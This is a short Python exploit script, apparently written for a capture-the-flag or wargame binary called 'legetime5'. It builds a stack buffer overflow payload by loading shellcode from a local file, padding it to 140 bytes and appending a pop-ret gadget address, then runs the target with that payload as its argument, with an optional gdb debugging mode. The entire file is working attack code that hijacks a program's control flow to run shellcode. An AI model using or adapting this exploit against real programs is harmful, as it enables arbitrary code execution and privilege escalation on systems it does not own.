#!/usr/bin/python

import os
import struct

DEBUG=False
filename = "./legetime5"

def p(a):
  return struct.pack('I', a)

def run(args):
    if DEBUG:
      os.execvp("gdb", ["gdb", "-n", "-x", "~/.gdbinit", "--args", filename] + args)
    else:
      os.execv(filename, [filename] + args)


shellcode=open("e-penis", "r").read()

popret = p(0x080484b5)

overflow = shellcode + 'A'*(140-len(shellcode)) + popret

args = [overflow]

run(args)

